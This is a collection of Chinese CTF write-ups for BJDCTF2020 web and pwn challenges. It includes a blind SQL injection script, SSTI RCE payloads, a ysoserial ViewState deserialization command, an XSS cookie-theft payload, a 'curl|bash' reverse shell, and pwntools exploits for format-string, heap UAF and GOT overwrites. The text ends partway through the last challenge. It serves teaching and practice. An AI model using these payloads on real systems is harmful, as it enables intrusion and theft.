# BJDCTF2020_March

> 本届BJDCTF由江苏科技大学、北京工业大学、西南民族大学、杭州师范大学、 江苏大学、湖南工业大学（排名不分先后）联合举办

**Notes:web题目easyaspnet需要在windows server 2016 docker native container 环境下 build 和 run**

# web

## Schrödinger - imagin

**tags:**

1. 查看源码
2. 时间戳
3. 修改cookie

打开网页，发现是个 login fucker，推测题目的意思是找一个能 fuck 的 login page，查看源码发现有一行白色的字体不显示，提示有 test.php，访问发现是个登录框。将 `http://localhost/test.php` 提交，发现网站貌似开始了爆破，但是爆破成功率却涨的很慢。查看 cookie 发现有个 `base64` 的 cookie 很可疑，decode 一下发现是提交时的时间戳。 

![图片一](https://uploader.shimo.im/f/ovITnY12MI8z2Hgn.png!thumbnail)


将该 cookie 直接置空，刷新页面就发现成功率接近百分之百，check 一下得到爆破的结果.

![图片2](https://uploader.shimo.im/f/63c0quwSRtETMSgH.png!thumbnail)

![图片3](https://uploader.shimo.im/f/QzFD2j7lqMQSnBzh.png!thumbnail)

通过 av 号在 b 站找到对应的视频，根据时间戳翻评论区，即可得到 flag

![图片4](https://uploader.shimo.im/f/Z42uS0oi1Lg8p2Pd.png!thumbnail)

## GirlFriendSqlInjection - P3rh4ps

基础 regexp 盲注

有一个小 trick 密码是大小写混合的 所以要用 binary

```
import requests
// P3rh4ps tql!!!
url='http://39.106.207.66:2333/'
def str2hex(string):
    c='0x'
    a=''
    for i in string:
        a+=hex(ord(i))
    return c+a.replace('0x','')
alphabet = ['!','[',']','{','}','_','/','-','&',"%",'#','@','a','b','c','d','e','f','g','h','i','g','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','G','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']


flag='^'
for i in range(0,20):
    for y in alphabet:
        tmp=flag+y
        data = {
            "username": "P3rh4ps\\",
            "password": "||password regexp binary {}#".format(str2hex(tmp))
        }
   #     print(data['password'])
        x=requests.session()
        if 'BJD needs' in x.post(url,data=data).text:
        #    print(x.post(url,data=data).text)
            flag=tmp
            break
    print(flag.replace("^",""))
```

## duangShell - Mrkaixin

入题直接给了 hint 说明了 swp 泄露

![图片5](https://uploader.shimo.im/f/fOQ9J0Vv4jUXxLaU.png!thumbnail)

vi -r .index.php.swp 可以恢复文件，保存一下就行了

![图片6](https://uploader.shimo.im/f/49UJFcBdGNolqqhP.png!thumbnail)

由于这里使用的`exec`，并且过滤了蛮多。写 shell，大概率不可能了。很容易想到可以弹 shell

这里可以利用 curl xxxx|bash 来弹 shell

首先在服务器上创建一个文件 Mrkaixin.txt,写入弹 shell 的语句

![图片7](https://uploader.shimo.im/f/sUUEWobOZNI1PB9d.png!thumbnail)

然后来一发~~~

![图片8](https://uploader.shimo.im/f/vX5iALDxXDIwSSwc.png!thumbnail)

然后服务器用 nc 接一下

![图片9](https://uploader.shimo.im/f/DVf8r6ezStMrHD73.png!thumbnail)

发现/flag 是假的，然后利用 find 命令找到 flag

find / -name flag

![图片10](https://uploader.shimo.im/f/AtoBeIFAKB0kDGx8.png!thumbnail)

## fake google - rdd

点击链接后发现是一个 google 的界面

点击搜索按钮没有反应

直接在搜索框中输入文字，回车，跳转到./qaq 界面

在源码里发现提示是 ssti，且很轻易的知道，利用是输入的文字

![图片11](https://uploader.shimo.im/f/crZAyRXWT9gtE0s6.png!thumbnail)

测试?name={{7*7}}

![图片12](https://uploader.shimo.im/f/s5r7Hko92bIFejeO.png!thumbnail)

回显是 49，确定存在 ssti

直接使用 payload：?name={{ config.__class__.__init__.__globals__['os'].popen('ls /').read() }}

![图片13](https://uploader.shimo.im/f/Jt37fyYCHzwm0Mx2.png!thumbnail)

找到 flag 就在根目录

cat /flag 时回显：BJD in P3's gf's name !!!!!???

![图片14](https://uploader.shimo.im/f/666u8gGm8h4jiSZZ.png!thumbnail)

这里是一个 trick，对输出的 BJD 做出了过滤，输出方法不唯一，这里给出的解法是字符串切片操作：qaq?name={{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read()[1:] }}

![图片15](https://uploader.shimo.im/f/FEnFbk4IBXQJQTSk.png!thumbnail)

## 文件探测 - Y1ng

题目详细解析： [https://www.gem-love.com/ctf/2097.html#File_Detect](https://www.gem-love.com/ctf/2097.html#File_Detect)

出题笔记： [https://www.gem-love.com/ctf/2056.html#i](https://www.gem-love.com/ctf/2056.html#i)

1.在 header 可以发现 hint：home.php

2.访问 home.php 跳转到/home.php?file=system，用伪协议可以读 system 的源码/home.php?file=php://filter/convert.base64-encode/resource=system

3.由题目告知的“你知道目录下都有什么文件吗”，扫一下或者怎么样的，发现 robots.txt，由 robot 得知 admin.php，访问 admni.php 之后告知需要本地访问，SSRF 的题

4.分析 system.php 可以发现格式化字符串漏洞，把能 admin.php 源码打出来：

	你知道目录下都有什么文件吗：随便填
	
	输入 url: http://127.0.0.1/admin.php?A=
	
	何种方式访问: GET%s% (后面的%用来把%d 的%转义掉)

5.第 4 步得到了 admin.php 的源码，分析之后发现是不可被破解的随机数。好在密文放在 session，因此可以通过删除 PHPSESSID 来解决这个问题

	5.1 首先本地计算一个 data 为空的密文

```
    <?php
    function aesEn($data, $key)
    {
        $method = 'AES-128-CBC';
        $iv = md5('8.8.8.8', true);  //这里填你的 IP
        return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));
    }
    $cipher = aesEn('', 'y1ng');
    echo $cipher;
```

    5.2 然后把 admin.php 的 PHPSESSID 删掉，访问 /decrypt=计算出来的 cipher ,得到 flag

![图片16](https://uploader.shimo.im/f/cOuZB50w59It1KdS.jpg!thumbnail)

BJD{W0W_nOW_Y0U_4r3_My_4dm1n}

## 假猪套天下第一 - Y1ng

题目详细解析： [https://www.gem-love.com/ctf/2097.html#i-3](https://www.gem-love.com/ctf/2097.html#i-3)

出题笔记： [https://www.gem-love.com/ctf/2056.html#i-2](https://www.gem-love.com/ctf/2056.html#i-2)

1.登录，登上去啥也没有，在登录时候抓包，得到 <!-- L0g1n.php --> 访问它

2.访问后告诉 99 年后才能访问 在 cookie 发现一个叫 time 的时间戳，把时间戳改大点改到 99 年以后就可以了

3.后面就是验证各种 header 见图片 ,

	3.1 本地访问需要用 Client-IP(或者 X-Real-IP)这个 header，XFF 不行
	
	3.2 告知用 Commodo 64 访问，但是 UA 改成 Commodo 64 后被告诉这不是真的 commodo64，随便查一下就能发现有一种系统叫 Commodore，所以要改成 Commodore 64（也可以直接查它的 UA 的标准形式）

![图片17](https://uploader.shimo.im/f/299FK6Th7fAq62FY.jpg!thumbnail)

（直接搜就能搜出来，不知道为什么那么多人搜不到；而且 Commodore 64 是上个世纪比较有名的一种电脑，感觉应该很多人都知道）

或者查 User-Agent 大全也能查到 Commodore 64 的 UA：

```
"Contiki/1.0 (Commodore 64; http://dunkels.com/adam/contiki/)"
```

![图片18](https://uploader.shimo.im/f/xWsJQykeDEcHwAss.jpg!thumbnail)

4.header 改完之后，被告知“你仍然不知道 flag 在哪儿”。如果用的 burp 直接能看到有个注释，base 解码后就是 flag；如果是浏览器插件，查看网站源代码看不到，可以审查元素得到 flag

BJD{Adm1n_1s_us3Less_hahhhhh}

## Element Master - Y1ng

题目详细解析： [https://www.gem-love.com/ctf/2097.html#Element_Master](https://www.gem-love.com/ctf/2097.html#Element_Master)

出题笔记： [https://www.gem-love.com/ctf/2056.html#Element_Master](https://www.gem-love.com/ctf/2056.html#Element_Master)

[Hint for ElementMaster]

1.不需要扫描器，扫也扫不出来东西

2.mendeleev=门捷列夫

3.use some of your out of the box thinking

4.from requests import *

5.[https://translate.google.com/](https://translate.google.com/)

6.用上 hint2 和 hint4

最后一小时给的 hint：

元素周期表字典+hex2string （相当于题目白给了）



虽然脑洞题，但是 hint 给的够多了。门捷列夫发现了元素周期表，而且漫画的图片文件名也叫 mendeleev.jpg，所以题目在暗示元素周期表相关。漫画上，右下角小人说它是全部 118 元素的 Master，还画着俄罗斯国旗、写着门捷列夫的俄文名，所以他就是门捷列夫。

查看源代码，Hex 转 String 得到 Po.php，Po 正好符合门捷列夫说的危险的放射性元素，访问这个文件也确实能访问，可以得到一个点。

虽然做到这可能就不知道咋做了，但是现在还没有用到门捷列夫的<元素周期表>和<requests 模块>，所以很容易想到用 requests 去跑一下其他元素(不然 作为一个 web 题 flag 还能往哪藏)，做出来的人少估计是：懒得写脚本+找不到元素周期表字典

```
import os
import requests as req
elements = ('H', 'He', 'Li', 'Be', 'B', 'C', 'N', 'O', 'F', 'Ne', 'Na', 'Mg', 'Al', 'Si', 'P', 'S', 'Cl', 'Ar',
                  'K', 'Ca', 'Sc', 'Ti', 'V', 'Cr', 'Mn', 'Fe', 'Co', 'Ni', 'Cu', 'Zn', 'Ga', 'Ge', 'As', 'Se', 'Br', 
                  'Kr', 'Rb', 'Sr', 'Y', 'Zr', 'Nb', 'Mo', 'Te', 'Ru', 'Rh', 'Pd', 'Ag', 'Cd', 'In', 'Sn', 'Sb', 'Te', 
                  'I', 'Xe', 'Cs', 'Ba', 'La', 'Ce', 'Pr', 'Nd', 'Pm', 'Sm', 'Eu', 'Gd', 'Tb', 'Dy', 'Ho', 'Er', 'Tm', 
                  'Yb', 'Lu', 'Hf', 'Ta', 'W', 'Re', 'Os', 'Ir', 'Pt', 'Au', 'Hg', 'Tl', 'Pb', 'Bi', 'Po', 'At', 'Rn', 
                  'Fr', 'Ra', 'Ac', 'Th', 'Pa', 'U', 'Np', 'Pu', 'Am', 'Cm', 'Bk', 'Cf', 'Es', 'Fm','Md', 'No', 'Lr',
                  'Rf', 'Db', 'Sg', 'Bh', 'Hs', 'Mt', 'Ds', 'Rg', 'Cn', 'Nh', 'Fl', 'Mc', 'Lv', 'Ts', 'Og', 'Uue')
for symbol in elements:
    link = "http://element-master-bjdctf.y1ng.vip/" + symbol + ".php"
    response = req.get(link)
    if response.status_code == 200:
        print(response.text, end='')
    else:
        continue
```

运行脚本得到：And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php

访问即可得到 flag：

BJD{th3_3LemEnt5_w1LL_De5tR0y_y0u!!!}

## easyaspdotnet - glzjin

下面只贴步骤，一些小吐槽到 [https://www.zhaoj.in/read-6497.html](https://www.zhaoj.in/read-6497.html) 看吧~

1. 打开靶机，查看一下页面。有个按钮

![图片19](https://uploader.shimo.im/f/6urXmAtehTEXKTC0.png!thumbnail)

2. 查看一下页面源码，页面中有 VIEWSTATE 等值。

![图片20](https://uploader.shimo.im/f/DPCM9kXAYKgFNilQ.png!thumbnail)

3. 点一下按钮，输出了一张图片。查看一下文件路径，判断有任意文件读取。

![图片21](https://uploader.shimo.im/f/kVpNcdrO5s0n1IYN.png!thumbnail)

4. 根据 uri 的 .aspx 后缀，目标读取 web.config 文件，构造目录穿越尝试读取文件成功。

![图片22](https://uploader.shimo.im/f/cHRy0mzZOJkMF817.png!thumbnail)


查看 web.config 的内容，其中 machineKey 中的值均为固定值，根据上面那篇文章所述，这些值用来加密反序列化之后的 VIEWSTATE 等值。

```
<?xml version="1.0" encoding="UTF-8"?>

<configuration>

<system.web>

<machineKey validationKey="47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9" decryptionKey="B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5" validation="SHA1" decryption="3DES" />

</system.web>

</configuration>
```

5. 有了 VIEWSTATE 的加密密钥，我们就可以根据文章中的方法构造一个带回显的 VIEWSTATE Payload，来让服务器反序列化然后 RCE。

![图片23](https://uploader.shimo.im/f/viOA5gyceFctzKiK.png!thumbnail)

[https://github.com/pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net)

[1584803371549254c06b2ddaa1222dcea21d5c31f2](https://www.zhaoj.in/wp-content/uploads/2020/03/1584803371549254c06b2ddaa1222dcea21d5c31f2.zip)  [下载](https://www.zhaoj.in/wp-content/uploads/2020/03/1584803371549254c06b2ddaa1222dcea21d5c31f2.zip)

![图片24](https://uploader.shimo.im/f/VxbMIUZ46Jo9gBma.png!thumbnail)

```
PS C:\Users\Administrator\Downloads\exp> C:\Users\Administrator\Downloads\ysoserial-1.32\Release\ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "ExploitClass.cs;./System.dll;./System.Web.dll" --generator="CA0B0334" --validationalg="SHA1" --validationkey="47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9"
```

6. 然后将得到的 Payload 放入 POST 的请求的 VIEWSTATE，再将命令写入 cmd，发送即可 RCE。

![图片25](https://uploader.shimo.im/f/RKGmGokWPpgXLxsC.png!thumbnail)

![图片26](https://uploader.shimo.im/f/mSOxzE4XsI4fH1Ek.png!thumbnail)

![图片27](https://uploader.shimo.im/f/D1fyeJ6MtzIQn6OH.png!thumbnail)

7. Flag 到手~


## xss之光（你没有杨大树长） - 杨大树

1. 扫描敏感目录，有git泄漏

![图片28](https://uploader.shimo.im/f/IMOsKT45ioYkSzv9.png!thumbnail)

2. githack扫描得到源码

```
<?php
$a = unserialize($_GET['yds_is_so_beautiful']);
echo $a;   
```

3. 结合题目名字知道应该是利用php的原生类进行xss

payload

```
<?php
$a = serialize(new Exception("<script>window.location.href='xxxx'+document.cookie</script>"))
echo $a;
```

4. 然后可以在cookie中找到flag

# Pwn

## ret2text3.0 - 知世

紧接上次 bjdctf,ret2text2.0

考点:短整型溢出

漏洞在name_check函数

```
char *__cdecl name_check(char *s)
{
  char dest; // [esp+7h] [ebp-11h]
  unsigned __int8 v3; // [esp+Fh] [ebp-9h]

  v3 = strlen(s);
  if ( v3 <= 3u || v3 > 8u )
  {
    puts("Oops,u name is too long!");
    exit(-1);
  }
  printf("Hello,My dear %s", s);
  return strcpy(&dest, s);
}
```

可以看到v3类型为unsigned int8,因此其长度最长只有255,再长则会回环,从而绕过限制

exp:

```

#!/usr/bin/env python

# -*- coding: utf-8 -*-

#Author:ZhiShi

#Tag:exp

from pwn import *

#context.log_level='debug'

p=process('./pwn')
elf=ELF('./pwn')



backdoor=p32(0x804858b)

payload='a'*21+backdoor

payload+='b'*(262-len(payload))

p.sendline(payload)

p.interactive()

```


## ret2text4.0 - 知世

题目很简单,格式化字符串漏洞和栈溢出,开了 canary

考点:用格式化字符串写__stack_chk_fail 函数来 bypass canary

首先给了后门函数,漏洞在main函数中,很明显的格式化字符串漏洞,还有一个溢出,但是因为溢出位数很少,程序又开了canary,所以这里考虑用格式化任意写来写__stack_chk_fail故意引发保护来达到攻击效果

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-30h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  read(0, &buf, 0x38uLL);
  printf(&buf, &buf);
  return 0;
}
```

exp:

```
#!/usr/bin/env python

# -*- coding: utf-8 -*-

#Author:ZhiShi

#Tag:exp



from pwn import *

context.log_level = 'debug'

p = process('./pwn')

elf = ELF('./pwn')



__stack_chk_fail=elf.got['__stack_chk_fail']

pay = "%64c%9$hn%1510c%10$hnAAA" + p64(__stack_chk_fail+2) + p64(__stack_chk_fail)

p.sendline(pay)

p.interactive()

```

## YDSneedgirlfriend2.0 - 知世

由于上次 fastbin 的 uaf 效果不好,这次就出一个更简单的 tcache 的吧

考点:tcache uaf

漏洞即free后未置NULL,同时给了后门函数,因此这里考虑直接用后门函数覆写函数指针

exp:


```

#!/usr/bin/env python

# -*- coding: utf-8 -*-

#Author:ZhiShi

#Tag:exp



from pwn import *



context.terminal=['tmux','splitw','-h']



r = process('./pwn')



def add(size, content):

    r.recvuntil(":")

    r.sendline("1")

    r.recvuntil(":")

    r.sendline(str(size))

    r.recvuntil(":")

    r.sendline(content)





def dele(idx):

    r.recvuntil(":")

    r.sendline("2")

    r.recvuntil(":")

    r.sendline(str(idx))





def show(idx):

    r.recvuntil(":")

    r.sendline("3")

    r.recvuntil(":")

    r.sendline(str(idx))







magic = 0x0400d86



add(32, "aaaa") 

add(32, "bbbb") 





dele(0) 

dele(0) 



add(32, p64(magic)) 

add(32,p64(magic))

add(16,p64(magic)*2)



show(0) 

r.interactive()



```


## 一把梭(one_gadget) - TaQini

考察点：one_gadget

题目给出了 printf 的地址，由此可算得 libc 基址，然后找 one_gadget、计算 libc 中 one_gadget 地址

```
  printf("Give me your one gadget:");
  __isoc99_scanf("%ld", &v4);
  v5 = v4;
  v4();
```

v4 是个函数指针，scanf 的时候把 one_gadget 转成十进制输入即可 getshell。

```
#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './one_gadget'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = './libc.so.6'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

# gadget
one_gadget = 0x106ef8 #execve("/bin/sh", rsp+0x70, environ)

# elf, libc
printf_libc = libc.symbols['printf']
ru('here is the gift for u:')
printf = int(rc(14),16)
info_addr('printf',printf)
libc_base = printf-printf_libc
info_addr('libc_base', libc_base)
info_addr('one gadget', one_gadget+libc_base)
ru('gadget:')
sl(str(one_gadget+libc_base))

p.interactive()
```

## Imagin 的小秘密(secret) - TaQini
考察点：缓冲区溢出、GOT 表覆写

```
.data:000000000046D080 ; char buf[]
.data:000000000046D080 buf             db 'Y0ur_N@me',0        
.data:000000000046D080                                         
.data:000000000046D08A                 align 10h
.data:000000000046D090 times           dq offset unk_46D0C0    
.data:000000000046D090                                         
.data:000000000046D090 _data           ends
```

程序开头 read(0, buf, 0x16)，实际上 buf 大小只有 0x10，后 6 字节会覆盖 times 变量

```
void __noreturn sub_401301()
{
  puts("#====================================#");
  puts("#             GAME OVER              #");
  puts("#====================================#");
  sub_4011C2("#        BYE BYE~                    #", 18LL);
  printf(buf, 18LL);
  puts(&byte_46B0A7);
  puts("@====================================@");
  exit(0);
}
```

猜错退出程序时，有个 printf 打印 buf 内容，查看 got 表，发现 printf 和 system 只差 0x10

```
[0x46d038] system@GLIBC_2.2.5 -> 0x401076 (system@plt+6) ◂— push   4
[0x46d040] printf@GLIBC_2.2.5 -> 0x401086 (printf@plt+6) ◂— push   5
```

所以把 times 覆盖成 got[printf]

```
buf='/bin/sh;' ; got[printf] -> system
```

times每猜对一次自减1，控制猜对的次数，即可构造出system("/bin/sh")


exp:

```
sl('/bin/sh;AAAAAAAA'+p32(0x46d040))
secret = [18283,11576,17728,15991,12642,16253,13690,15605,12190,16874,18648,10083,18252,14345,11875]
for i in secret:
    send_secret(i)

send_secret(66666)
```

只用找出前 0x10 个 secret 即可，不过，硬要找全 10000 也不难，正则匹配一下就好 。

## Test your ssh(test) - TaQini

> 由于 Ubuntu 14 之后，通过 egid 执行/bin/sh 的权限被 ban 了,所以这次比赛 ssh 靶机用的全是 Ubuntu 14.04

考察点：linux 基础

这题设置的目的是测试 ssh 连接显示编码什么的是否正常，但是直接白给不太好，就加了个字符过滤。看源码，可知过滤了以下字符：

```
 n e p b u s h i f l a g | / $ ` - < > .
```

于是就找可用的命令呗，先看下环境变量 PATH，然后 grep 搜一下

```
$ env $PATH
$ ls /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin /usr/games /usr/local/games | grep -v -E 'n|e|p|b|u|s|h|i|f|l|a|g'
```

发现 od 幸存

```
ctf@f930cab87217:~$ ./test | grep 045102 -C 2
od *
uid=1000(ctf) gid=1000(ctf) egid=1001(ctf_pwn) groups=1000(ctf)
0000000 045102 075504 067145 067552 057571 067571 071165 070137
0000020 067167 063537 066541 076545 077412 046105 001106 000401
0000040 000000 000000 000000 000000 001000 037000 000400 000000
```

使用 od 输出 flag，然后解八进制即可



非预期解

x86_64 命令没有过滤掉，可以直接拿 shell

原理如下

```
ls -al /usr/bin/x86_64
lrwxrwxrwx 1 root root 7 8 月  23  2019 /usr/bin/x86_64 -> setarch
```

x86_64 是指向 setarch 命令(soft link)，查看一下 setarch 的文档，如下：

```
setarch - change reported architecture in new program environment and/or set personality flags 
...
The default program is /bin/sh.
```

## 挑食的小蛇(snake) - TaQini

考察点：字符串截断 or 耐心

背景知识：c 语言中字符串以'\x00'为结尾
把程序下载下来，调试，发现 Name 和 flag 相邻，相差 0x100 字节

```
pwndbg> p &Name
$1 = (<data variable, no debug info> *) 0x5555555592e0 <Name>
pwndbg> p &flag
$2 = (<data variable, no debug info> *) 0x5555555593e0 <flag>
```

查看源码：

```
void getName(){
    char buf[0x100];
    printf("请输入玩家昵称(仅限英文)[按回车开始游戏]:");
    scanf("%s",buf);
    strncpy(Name, buf, 0x100);
}
```

输入昵称时会 copy 0x100 个字节到 Name，所以只要输入长度为 0x100 的昵称，Name 的结尾就不会有'\x00'，游戏显示玩家昵称时就会把 Name 和 flag 一起打印出来。

```
# 正常情况
Name: 'TaQini\x00'
flag: 'flag{xxxx}\x00'
# 非正常情况
Name: 'TaQini.......flag\x00'
```

p.s.这题玩到 3000 分也可解，比赛时好多师傅硬怼出来的.....嗯...耐心也是一名 pwn 手的基本素养

## 贪吃的小蛇(snake2) - TaQini

考察点：scanf

这题的设计参考 pwnable.kr 的 passcode
题解详见: [https://blog.csdn.net/smalosnail/article/details/53247502](https://blog.csdn.net/smalosnail/article/details/53247502)
文章题目: scanf 忘记加'&'危害有多大？详解 GOT 表覆写攻击技术
拿到代码后找不同，看看那里和 snake1 不一样

获胜分数提高了，硬玩儿是玩儿不出来的

```
    printf("  控制 Imagin 吃豆豆，达到 300000 分\n");
getName 读昵称的长度变短了，不能利用 snake1 的解法
void getName(){
    char buf[0x100];
    printf("请输入玩家昵称(仅限英文)[按回车开始游戏]:");
    scanf("%s",buf);
    strncpy(Name, buf, 0x10);
}
```

多了一个调查问卷功能

```
void questionnaire(void){
    int Goal;
    char Answer[0x20];
    puts("你收到了一份来自 TaQini 的调查问卷");
    printf("1.Snake 系列游戏中，贪吃蛇的名字是:");
    scanf("%20s",Answer);
    printf("2.Pwn/Game 真好玩儿[Y/n]:");
    scanf("%20s",Answer);
    printf("3.你目标的分数是:");
    scanf("%d",Goal);
}
```

通过对比可知，snake1 的漏洞点在 getName，snake2 的漏洞点在 questionnaire

```
void GameRun(void) {
    unsigned int GameState=1;
    score=0;
    Level=1;
    printRule();
    getName();
    questionnaire();
    PSnake jack=Init();
    //...
}
```

查看 questionnaire 的上一层函数，可见 getName 和 questionnaire 用是同一片栈空间

按照 参考文章 中的做法，利用 scanf 覆写 got 表为后门 system("/bin/sh")的地址，即可 getshell

比如，后续的 Init 函数中调用了 malloc，因此可以覆写 malloc 的 got 表：

```
PSnake head=(PSnake)malloc(sizeof(Node));
```

这题 malloc 的 got 表地址 0x405078 都是可见字符，解题时甚至不用写脚本

```
name = 'a'*220+'xP@' # xP@ <- (malloc.got)
goal = 4201717 # <- backdoor
```

## 鹅螺狮的方块(els) - TaQini

考察点：格式化字符串

打开游戏，发现底部有个留言板十分瞩目，找到对应源码，发现存在格式化字符串漏洞:

```
  /* 实时显示留言 */
    fmsg = fopen("./msg","r+");
    if (NULL == fmsg) exit(0);
    char message[0x100] = {0};
    fread(message,0x80,1,fmsg);
    fprintf(stdout,"\033[22;1H 留言:");
    fprintf(stdout,message);
```

那么本题的主要漏洞就是他了。

知己知彼，百战不殆。要想pwn掉els，需要先对程序了解个大概。于是浏览源码：

1. 程序开头读取本地 record 文件，加载变量最高记录，随后判断最高分数，大于阈值就给 shell

```
/* 读取文件的最高记录 */
    fp = fopen("./record","r+");
    if (NULL == fp)
    {
        /*
         * 文件不存在则创建并打开
         * "w"方式打开会自动创建不存在的文
         */
        fp = fopen("./record","w");
    }
    fscanf(fp,"%u",&maxScore);

    if(maxScore > 666666)
    {
        puts("干的漂亮！奖励鹅罗狮高手 shell 一个！");
        system("/bin/sh");
        exit(0);
    }
```

2. 实时显示留言功能：读取 msg 文件，打印留言，其中 fprintf(stdout,message)存在漏洞

```
    /* 实时显示留言 */
    fmsg = fopen("./msg","r+");
    if (NULL == fmsg) exit(0);
    char message[0x100] = {0};
    fread(message,0x80,1,fmsg);
    fprintf(stdout,"\033[22;1H 留言:");
    fprintf(stdout,message);
```

3. 消除方块功能：更新最高分数，将最高分写入 record 文件

```
void checkDeleteLine(void)
{
// ...
            /* 记录最高分 */
            if (score > maxScore)
            {
                maxScore = score;
                /* 保存最高分 */
                rewind(fp);
                fprintf(fp,"%u\n",maxScore);
            }
//...
```

鲁迅曾经说过：

> 一切皆文件

所以上述代码的浏览主要以 msg 和 record 这两个文件为线索。

现在思路就很明朗了，通过格式化字符串漏洞修改 maxScore，消除一行方块，触发历史记录更新，改写 record 文件，重新开始游戏，getshell。

>关于文件权限，可以通过 ls -al 查看：
>msg 可读可写，record 可读，只有运行 els 程序时可写


由于开了地址随机化，maxScore 的地址不固定，但是这在格式化字符串漏洞面前都不是事儿，先泄漏，再改写即可。exp 如下：

leak.py

```
#!/usr/bin/python
payload = "%73$p"
f = open('/home/ctf/msg','w')
f.write(payload)
f.close()
```

exp.py

```
#!/usr/bin/python
from struct import pack
from sys import argv

start = eval(argv[1])
score = start-0x1180+0x53ac

# hex(666666) = 0xa2c2a
payload = "%20c%8$n" + pack('<Q', score+2)
print hex(score)
f = open('/home/ctf/msg','w')
f.write(payload)
f.close()
```

上述两个文件放到/tmp 目录下，先执行 leak 拿到程序基址，再通过 exp 计算 maxScore 地址并改写。消除一行方块后触发记录更新，游戏结束后 maxScore 写入文件，再次打开游戏即可 getshell。

## 营救 Imagin(rci) - TaQini

考察点：linux 基础，ls 命令

> 本题的设计源于 HGame2020 - findyourself
> 题解链接： [http://taqini.space/2020/02/12/2020-Hgame-pwn-writeup/#findyourself](http://taqini.space/2020/02/12/2020-Hgame-pwn-writeup/#findyourself)

背景就不多介绍了，imagin 被关进了随机创建的 48 个房间之一，这时有一次执行系统命令的机会，经过层层过滤，只有 ls 命令可用，使用 ls 获取一些线索后，就要输入 imagin 所在的正确房间号了，答对后获得第二次执行系统命令的机会，可以 getshell。

在 hgame-fys 中第一次命令执行是通过 ls -l /proc/self/cwd 获取的当前目录，而本题没有给/proc，所以要另辟蹊径，也就是本题的考察点 inode 了。

inode 是 linux 用于文件储存的索引节点，操作系统大家应该都学过：

> 系统读取硬盘的时候，不会一个个扇区的读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个“块”（block）。这种由多个扇区组成的“块”，是文件存取的最小单位。“块”的大小，最常见的是 4KB，即连续八个 sector 组成一个 block。
> 文件数据都储存在“块”中，那么很显然，我们还必须找到一个地方储存文件的“元信息”，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做 inode。
> 摘自： [https://blog.csdn.net/xuz0917/article/details/79473562](https://blog.csdn.net/xuz0917/article/details/79473562)

也就是说 inode 和文件是一一对应的，鲁迅曾经说过：

> 一切皆文件

目录也是文件，也有他对应的 inode，于是，本题的重点来了——ls命令常用参数（敲黑板）

```
ls -l  # 以列表格式显示
ls -a  # 不隐藏以.开头的文件
ls -i  # 显示文件 inode
```

众所周知，当前目录文件用 . 表示，所以输入 ls -ali 命令即可显示当前目录的 inode 号

也就是说，imagin 所在房间的 inode 已知了，但是 . 是相对路径，题目中要求验证绝对路径

于是想办法查看绝对路径，我们已知房间是在/tmp 目录下的，所以不难想到，再开一个 shell，输入 ls -ali /tmp 显示/tmp 目录下所有文件 inode，根据唯一的 inode 找到对应房间号，即可通过 check1。

本题重点结束。

check2 也过滤了一些字符，可以通过输入 $0 绕过。


## 我们不一样(diff) - TaQini 

考察点：栈溢出

> 题目是汇编写的，所以就没给源码，做题时需要把文件下载到本地分析。
> 下载方法挺多的，这里说两种比较直接的方法：
>  1. base64编码后复制粘贴到本地  
>  2. scp 命令 使用ssh协议传输文件

用过diff命令的师傅不难看出，这题是一个缩减版的diff命令，功能是比较两个文件，输出两文件内容不相同的那一行的行号。分析程序，打开文件部分没得说，直接看比较函数：

```
int __cdecl compare(int a1, int fd)
{
  char v2; // al
  int v4; // [esp+0h] [ebp-80h]
  unsigned int i; // [esp+4h] [ebp-7Ch]
  char addr[120]; // [esp+8h] [ebp-78h]
  v4 = 0;
  JUMPOUT(sys_read(fd, buf1, 0x80u), 0, &failed);
  JUMPOUT(sys_read(a1, addr, 0x80u), 0, &failed);
  for ( i = 0; addr[i] + buf1[i] && i < 0x400; ++i )
  {
    v2 = buf1[i];
    if ( v2 != addr[i] )
      return v4 + 1;
    if ( v2 == 10 )
      ++v4;
  }
  return 0;
}
```

addr长度120，read读了128字节，很明显的栈溢出。此外buf1具有可执行权限：

```
pwndbg> p &buf1
$2 = (<data variable, no debug info> *) 0x804a024 <buf1>
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x804a000 r-xp     2000 0      /xxx/diff
